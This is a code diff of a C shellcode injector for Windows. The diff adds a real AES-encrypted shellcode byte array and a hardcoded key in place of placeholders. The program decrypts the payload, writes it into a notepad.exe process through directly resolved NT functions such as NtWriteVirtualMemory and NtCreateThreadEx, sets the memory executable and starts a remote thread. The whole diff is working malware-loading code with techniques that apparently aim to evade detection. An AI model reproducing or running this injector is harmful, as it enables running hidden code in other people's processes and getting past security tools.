@@ -9,6 +9,8 @@
 #include <string.h>
 
 #define AES_BLOCK_SIZE 16
+#define INITIAL_HASH 0xABCD1234  // Początkowy wektor
+#define MIX_CONSTANT 0x9E3779B9  // Stała mieszająca
 
 typedef BOOL (*pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
 
@@ -18,7 +20,31 @@ typedef struct _SYSCALL_ENTRY {
 } SYSCALL_ENTRY;
 
 
-BYTE shellcode[] = {"your AES encrypted payload"};
+BYTE shellcode[] = {0xde, 0xc9, 0x43, 0x4d, 0x03, 0x0a, 0xe8, 0x8d, 0x19, 0x61, 0x2b, 0xf4, 
+    0x62, 0x95, 0x15, 0x26, 0xe1, 0x2a, 0x65, 0xd3, 0xeb, 0x9e, 0x1a, 0x0d, 
+    0xb6, 0xa3, 0xc9, 0xc4, 0x1f, 0x67, 0xab, 0xd0, 0x49, 0x99, 0x8b, 0x0f, 
+    0x80, 0x66, 0xba, 0x1f, 0xa3, 0x54, 0xd9, 0x38, 0x71, 0x47, 0x95, 0x60, 
+    0xa1, 0xb3, 0xde, 0xa4, 0xbd, 0xb9, 0x1f, 0x94, 0x78, 0x57, 0x9d, 0x90, 
+    0x28, 0xab, 0x2b, 0x45, 0xef, 0x2d, 0x65, 0xf9, 0x6e, 0x67, 0x82, 0x85, 
+    0x48, 0xc6, 0xd7, 0x6c, 0x5d, 0xb9, 0xf3, 0x19, 0x21, 0xd7, 0x01, 0x2f, 
+    0xb8, 0xac, 0xeb, 0x84, 0xa7, 0xae, 0xc4, 0x2d, 0x78, 0x76, 0x7d, 0x01, 
+    0x5c, 0x97, 0x6e, 0x48, 0xa8, 0x29, 0x31, 0x98, 0x6a, 0xa1, 0x24, 0xf4, 
+    0x98, 0xe9, 0x93, 0x2e, 0xe2, 0x7f, 0x49, 0x70, 0x28, 0x78, 0x65, 0xad, 
+    0xb9, 0x33, 0x27, 0xb1, 0x8d, 0x83, 0x68, 0x28, 0xa7, 0x24, 0x60, 0xc9, 
+    0xa5, 0x49, 0x82, 0xcc, 0xbf, 0x49, 0x62, 0x3a, 0x19, 0xa9, 0x62, 0x1d, 
+    0xff, 0xed, 0x79, 0xc3, 0xd8, 0x8f, 0x0f, 0x6d, 0x00, 0x5a, 0x99, 0xac, 
+    0x5b, 0x2a, 0x3b, 0xda, 0x09, 0x89, 0x00, 0x50, 0x6c, 0x8c, 0xe4, 0x71, 
+    0x99, 0xf7, 0x55, 0x86, 0x89, 0x9c, 0x48, 0xfc, 0x47, 0xdb, 0x33, 0x31, 
+    0xcb, 0x21, 0x72, 0xcb, 0xa0, 0xf4, 0x34, 0xf9, 0x60, 0x66, 0xbb, 0xd3, 
+    0x80, 0x99, 0x69, 0x0e, 0x63, 0x82, 0xcd, 0x42, 0x53, 0x0f, 0x56, 0x63, 
+    0x3b, 0xe4, 0xdb, 0x94, 0xd1, 0xa4, 0x85, 0xd2, 0x5f, 0xb2, 0x03, 0x5a, 
+    0x89, 0x81, 0xd1, 0x0b, 0x0b, 0x09, 0x1b, 0x25, 0xc7, 0xff, 0x1a, 0x67, 
+    0x1d, 0x3b, 0x5d, 0xf8, 0xee, 0x3d, 0x52, 0xfe, 0xf4, 0xb4, 0x05, 0x79, 
+    0xa8, 0x50, 0xc8, 0xed, 0x90, 0xaf, 0x5f, 0xb3, 0x09, 0x26, 0x49, 0x58, 
+    0x1f, 0x4f, 0xd7, 0xda, 0x9c, 0xe6, 0xf6, 0xc4, 0x6b, 0x75, 0xb9, 0xb4, 
+    0xf5, 0xc5, 0x37, 0x51, 0x8e, 0x37, 0x14, 0x79, 0x45, 0xc5, 0x43, 0xd9, 
+    0x46, 0xe6, 0xfa, 0xfb, 0x73, 0x42, 0xa7, 0x5a, 0xb4, 0xb0, 0xb4, 0x00};
+
     SIZE_T shellcodesize = sizeof(shellcode);
 
     void decryptData(const BYTE* encryptedData, SIZE_T encryptedSize, BYTE* outputData, SIZE_T* outputSize, const char* aesKey) {
@@ -26,20 +52,20 @@ BYTE shellcode[] = {"your AES encrypted payload"};
         HCRYPTKEY hKey = 0;
         HCRYPTHASH hHash = 0;
     
-        // Acquire a cryptographic provider context
+        //Acquiring a cryptographic provider context
         if (!CryptAcquireContextA(&hCryptProv, NULL, MS_ENH_RSA_AES_PROV_A, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
             printf("[-] CryptAcquireContext failed, error: %d\n", GetLastError());
             return;
         }
     
-        // Create a hash object
+        //Creating a hash object
         if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
             printf("[-] CryptCreateHash failed, error: %d\n", GetLastError());
             CryptReleaseContext(hCryptProv, 0);
             return;
         }
     
-        // Hash the AES key
+        //Hashing the AES key
         if (!CryptHashData(hHash, (BYTE*)aesKey, (DWORD)strlen(aesKey), 0)) {
             printf("[-] CryptHashData failed, error: %d\n", GetLastError());
             CryptDestroyHash(hHash);
@@ -47,7 +73,7 @@ BYTE shellcode[] = {"your AES encrypted payload"};
             return;
         }
     
-        // Derive an AES key from the hash
+        //Deriving an AES key from the hash
         if (!CryptDeriveKey(hCryptProv, CALG_AES_128, hHash, 0, &hKey)) {
             printf("[-] CryptDeriveKey failed, error: %d\n", GetLastError());
             CryptDestroyHash(hHash);
@@ -57,11 +83,11 @@ BYTE shellcode[] = {"your AES encrypted payload"};
     
         CryptDestroyHash(hHash); // No longer needed
     
-        // Copy encrypted data to output buffer
+        //Copying encrypted data to output buffer
         memcpy(outputData, encryptedData, encryptedSize);
         DWORD dataSize = (DWORD)encryptedSize;
     
-        // Perform decryption
+        //Perform decryption
         if (!CryptDecrypt(hKey, 0, TRUE, 0, outputData, &dataSize)) {
             printf("[-] CryptDecrypt failed, error: %d\n", GetLastError());
             CryptDestroyKey(hKey);
@@ -128,9 +154,9 @@ int main(void){
 
 //looking for required function addresses by names
     //char *functionNames[] = {"0x70F8084F", "0x6AA462C9", "0x0AEF06C2", "0x2C8B305F" , "0xE878E8F6"};
-    char *functionNames[] = {"NtCreateSection", "NtCreateThreadEx", "NtMapViewOfSection", "NtProtectVirtualMemory", "RtlAllocateHeap"};
+    char *functionNames[] = {"NtCreateSection", "NtCreateThreadEx", "NtMapViewOfSection", "NtProtectVirtualMemory", "NtWaitForSingleObject", "NtWriteVirtualMemory", "RtlAllocateHeap"};
     
-    void *function_addresses[4] = {0};
+    void *function_addresses[6] = {0};
     
     for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
         char* functionName = (char*)((PBYTE)FileView + addressOfNames[i]);
@@ -148,12 +174,14 @@ int main(void){
                         break;
                     }
                 }
-                printf("Function [%s] found at address: [0x%p] with syscall number [%d]\n",
-                       functionNames[j], functionPtr, syscallNumber);
+                printf("Function [%s] found at address: [0x%p] with syscall number [%d], [%d]\n",
+                       functionNames[j], functionPtr, syscallNumber, j);
             }
         }
     }
-
+/*---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/
+//creating snapshot
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
     if(snapshot == INVALID_HANDLE_VALUE){
         printf("[-] creating snapshot failed, error: [%d]\n", GetLastError());
@@ -162,7 +190,7 @@ int main(void){
         printf("[+] Creating snapshot\n");
 
 
-//enumeracja procesow w celu znalezienia procesu ofiary "notepad.exe"
+//looking for target process "notepad.exe"
     PROCESSENTRY32W hEntry;
     hEntry.dwSize = sizeof(PROCESSENTRY32W);
     THREADENTRY32 hTEntry; 
@@ -188,7 +216,7 @@ int main(void){
     }
     printf("[+] Opening the target process [%d]\n", hEntry.th32ProcessID);
 
-//creating a section object in the kernel 
+//creating the section object in the kernel 
     HANDLE hSection = NULL;
     LARGE_INTEGER maxSize;
     maxSize.QuadPart = 0x1000; 
@@ -217,29 +245,29 @@ int main(void){
 
     BYTE decryptedData[512] = { 0 }; // Buffer for decryption
     SIZE_T decryptedSize = sizeof(decryptedData);
-
-    const char* encryptionKey = "your AES key";
-
+    const char* encryptionKey = "ThisIsASecretKey";
     decryptData(shellcode, shellcodesize, decryptedData, &decryptedSize, encryptionKey);
+
+
 //copying code into section
-    SIZE_T written;
-//pWriteProcessMemory WriteProcessMemory= (pWriteProcessMemory)function_addresses[4];//pWriteProcessMemory
-    BOOL writeMem = WriteProcessMemory(hProcess, cSection, decryptedData, decryptedSize, &written);
-    if (writeMem == 0){
+    ULONG bytesWritten = 0;
+    PVOID baseAddress = cSection;  //must be pointer
+    SIZE_T regionSize = shellcodesize;  //size of written region
+    pNtWriteVirtualMemory NtWriteVirtualMemory= (pNtWriteVirtualMemory)function_addresses[5];
+    status = NtWriteVirtualMemory(hProcess, cSection, decryptedData, shellcodesize, &bytesWritten);
+    if(!NT_SUCCESS(status)){
         printf("[-] unable to write shellocde into process memory, error: [%d]\n", GetLastError());
-        VirtualFreeEx(hProcess, cSection, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         CloseHandle(FileMapd);
         CloseHandle(hFile);
         return 1;
     }
-    printf("[+] Writting shellcode into process [%d]\n", written);
+    printf("[+] Writting shellcode into process [%d]\n", bytesWritten);
+
 
 // Change Memory Protection: RW -> RX
-    PVOID baseAddress = cSection;  //must be pointer
-    SIZE_T regionSize = shellcodesize;  //size of written region
     _NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)function_addresses[3];
-	status = pNtProtectVirtualMemory(hProcess, &cSection, &decryptedSize, PAGE_EXECUTE_READ, &oldProtection);
+    status = pNtProtectVirtualMemory(hProcess, &cSection, &bytesWritten, PAGE_EXECUTE_READ, &oldProtection);
 	if (!NT_SUCCESS(status)) {
 		printf("[-] Failed to change memory protection from RW to RX: %x \n", status);
 		exit(-1);
@@ -249,27 +277,14 @@ int main(void){
     HANDLE hThread = NULL;
     PVOID remoteShellcode = (LPTHREAD_START_ROUTINE)cSection;
     _NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)function_addresses[1];
-//for proper operating requireing the PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION acces rights in OpenProcess function
-    status = NtCreateThreadEx(
-        &hThread,              
-        THREAD_ALL_ACCESS,     
-        NULL,                  
-        hProcess,               
-        remoteShellcode,       
-        NULL,                   
-        FALSE,                  
-        0,                      
-        0,                     
-        0,                      
-        NULL                    
-    );
+    //for proper operation requires the PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION acces rights in Open_Process function
+    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteShellcode, NULL, FALSE, 0, 0, 0, NULL);                   
     if (!NT_SUCCESS(status)) {
         printf("[-] Failed to Execute Remote Thread: 0x%X\n", status);
         exit(-1);
     }
 
     printf("[+] Injected shellcode!!\n");
-    system("pause");
 
 
     //NtClose(hSection);
